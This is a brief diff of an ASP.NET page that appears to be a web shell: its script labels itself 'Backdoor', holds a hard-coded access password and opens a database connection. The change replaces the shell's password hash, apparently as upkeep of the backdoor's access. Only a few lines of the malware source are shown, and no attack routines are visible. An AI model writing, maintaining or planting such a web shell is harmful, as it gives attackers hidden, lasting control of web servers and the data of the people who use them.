@@ -20,7 +20,7 @@
 <%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <script runat="server">
-public string Password="bdbca288fee7f92f2bfa9f7012727740";
+public string Password="b0c545fc263ccdb119a35d021e593ba5";
 public string vbhLn="Backdoor";
 public int TdgGU=1;
 protected OleDbConnection Dtdr=new OleDbConnection();
